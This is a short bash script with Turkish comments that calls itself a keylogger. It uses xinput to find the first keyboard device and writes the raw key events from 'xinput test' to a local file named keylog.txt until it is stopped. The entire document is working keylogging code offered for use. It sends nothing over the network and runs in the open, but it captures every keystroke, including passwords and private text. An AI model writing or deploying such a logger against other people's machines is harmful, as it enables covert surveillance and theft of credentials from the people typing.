#!/bin/bash

# Klavye aygıtının ID'sini al
keyboard_id=$(xinput list | grep -i 'keyboard' | grep -o 'id=[0-9]*' | cut -d= -f2 | head -n1)

if [[ -z "$keyboard_id" ]]; then
  echo "Klavye aygıtı bulunamadı!"
  exit 1
fi

log_file="keylog.txt"
echo "[*] Keylogger başladı (Device ID: $keyboard_id)" | tee -a "$log_file"
echo "Çıkmak için CTRL+C" | tee -a "$log_file"

xinput test "$keyboard_id" | while read -r line; do
  echo "$line" >> "$log_file"
done
